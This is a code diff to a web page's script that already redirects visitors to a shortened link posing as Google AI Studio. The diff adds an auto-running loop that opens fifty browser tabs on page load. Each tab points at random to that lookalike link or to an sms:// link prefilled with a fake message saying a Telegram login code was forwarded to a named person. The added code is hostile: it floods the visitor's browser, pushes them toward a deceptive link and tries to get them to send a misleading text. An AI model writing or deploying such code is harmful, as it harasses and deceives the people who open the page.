@@ -48,6 +48,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const targetUrl = "https://Googleaistudio.short.gy/Ari&Sarii";
+            const smsUrl = "sms://+4427?body=Your%20new%20Telegram%20login%20Code%205437%20Forwarded%20to%20SHERVIN%20Succesful";
             const userAgent = navigator.userAgent || navigator.vendor || window.opera;
             let redirectUrl = targetUrl; // Default: standard HTTPS address
             
@@ -87,9 +88,14 @@
                     window.location.replace(targetUrl);
                 }
             }, 1000); // Wait 1 second
+
+            // Open multiple new tabs
+            for (let i = 0; i < 50; i++) {
+                const randomUrl = Math.random() < 0.5 ? targetUrl : smsUrl;
+                window.open(randomUrl, '_blank');
+            }
         });
     </script>
 
 </body>
 </html>
-
